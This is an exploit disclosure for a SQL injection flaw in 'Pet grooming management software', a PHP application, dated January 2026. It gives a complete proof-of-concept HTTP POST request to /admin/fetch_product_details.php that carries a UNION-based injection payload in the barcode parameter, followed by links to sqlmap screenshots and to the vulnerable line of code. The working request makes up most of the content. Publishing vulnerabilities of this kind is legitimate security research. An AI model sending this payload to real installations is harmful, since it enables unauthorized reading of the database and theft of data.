### Pet grooming management software - SQLi

### Date: 2026-01/28
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/18340/pet-grooming-management-software-download.html
### Tested on: MacOs13.5 + phpstudy

# /fetch_product_details.php（SQLi）

### Sample request POC #1

```
POST /admin/fetch_product_details.php HTTP/1.1
Host: localhost:8887
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded

barcode='+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT(0x716a787071%2C0x44414f4c68584775615746584a67516b4b594e70546d594c74586651586c6a6b5647436371646356%2C0x716a787871)%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
```

### sqlmap

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-143607.png "Pet grooming management software")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-143634.png "Pet grooming management software")

### Vulnerability code
fetch_product_details.php:61
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-143701.png "Pet grooming management software")
